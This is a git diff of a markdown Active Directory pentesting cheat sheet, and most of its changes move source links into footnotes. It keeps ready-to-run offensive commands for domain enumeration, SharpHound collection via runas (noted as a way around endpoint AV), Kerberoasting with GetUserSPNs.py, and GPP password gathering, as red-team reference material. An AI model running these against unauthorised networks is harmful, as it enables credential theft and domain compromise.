@@ -27,8 +27,7 @@ net group "domain admins" /domain
 klist
 ```
 ___
-## NLTest
-   * Source: [ired.team](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets)
+## NLTest[^1]
        
 ```batch
 nltest /dclist:<domain>
@@ -36,8 +35,7 @@ nltest /dsgetdc:<domain>
 nltest /domain_trusts /all_trusts
 ```
 ___
-## Powershell Enumeration
-   * Source: [ired.team](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets)
+## Powershell Enumeration[^1]
 
 ```powershell        
 [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
@@ -49,9 +47,7 @@ ___
 
 ## [Dumping credentials](../../#dumping-credentials)
 ___
-## Bloodhound (Sharphound) 
-
-* Source: [hausec](https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/)
+## Bloodhound (Sharphound)[^2] 
 
 1. On local machine  (~Kali)
 
@@ -67,27 +63,24 @@ sudo apt install neo4j bloodhound
 bloodhound
 ```
 
-1. Sharphound Officialy supported ingestors
-   * Running the official/supported Sharphound ingestors collects more information
-       * although Bloodhound.py is good for most cases
-   * Source: 
-       * [Github](https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors)
-       * [ReadTheDocs](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html)
-```powershell
-# If logged in on a local user account but have domain user credentials, then on the command-line
-C:\> runas /netonly /user:<DOMAIN>\<username> powershell.exe
-
-# then on the spawned powershell
-Import-Module .\SharpHound.ps1
-Invoke-BloodHound -CollectionMethod All -CompressData -RemoveCSV -NoSaveCache
-```
+1. Sharphound Officialy supported ingestors [^3][^4]
+   * Running the official/supported Sharphound Collectors collects more information [
+       * although Bloodhound.py is quick and good for most cases
+   * Runas
+       * If logged in on a local user account but have domain user credentials, then on the command-line
+       * This works also to get SharpHound to work and ingest data even if your own Windows VM is not part of the Domain.
+           * This bypasses the need to run SharpHound ps1 on the host itself with AVs/ERDs
+   ```powershell
+   C:\> runas /netonly /user:<DOMAIN>\<username> powershell.exe
+   
+   # then on the spawned powershell
+   Import-Module .\SharpHound.ps1
+   Invoke-BloodHound -CollectionMethod All -CompressData -RemoveCSV -NoSaveCache
+   ```
 
 ___
 ## General Attack methods
-* Sources:
-    * [Red Siege](https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf)
-    * [Orange Cyberdefense](https://raw.githubusercontent.com/Orange-Cyberdefense/arsenal/master/mindmap/pentest_ad.png)
-* Methods
+* Methods [^5][^6]
      * Golden Ticket
          * Requires full domain compromise.
          * Used for persistenceand pivoting
@@ -106,10 +99,7 @@ ___
 ___
 
 ## Kerberoasting
-* Source: 
-    * [hausec](https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/)
-    * [Tarlogic Security](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
-1. From Linux
+1. From Linux [^1][^7]
     * Beware of time difference of the attacking machine (Kali) and the targeted Domain Controller
     ```bash
     GetUserSPNs.py -debug -request -outputfile TGS_file.txt -dc-ip <DC_IP_Address> <FQDN>/<username>
@@ -123,9 +113,7 @@ ___
 
 ___
 
-## Gathering Windows GPP passwords 
-
-Source: [Pure Security](https://pure.security/dumping-windows-credentials/)
+## Gathering Windows GPP passwords[^8]
 
 1. On target machine logged-on with a regular domain account
     ```batch
@@ -138,12 +126,18 @@ Source: [Pure Security](https://pure.security/dumping-windows-credentials/)
 
 ___
 
-## ADFind
-* Source:
-    * [redcanary](https://redcanary.com/threat-detection-report/techniques/domain-trust-discovery/)
-    
+## ADFind[^9]
 ```batch
 adfind.exe -f objectclass=trusteddomain
 adfind.exe -sc trustdmp
 ```
     
+[^1]: [ired.team](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets)
+[^2]: [hausec](https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/)
+[^3]: [Github - Bloodhound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)
+[^4]: [ReadTheDocs - Bloodhound](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html)
+[^5]: [Red Siege](https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf)
+[^6]: [Orange Cyberdefense](https://raw.githubusercontent.com/Orange-Cyberdefense/arsenal/master/mindmap/pentest_ad.png)
+[^7]: [Tarlogic Security](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
+[^8]: [Pure Security](https://pure.security/dumping-windows-credentials/)
+[^9]: [Redcanary](https://redcanary.com/threat-detection-report/techniques/domain-trust-discovery/)
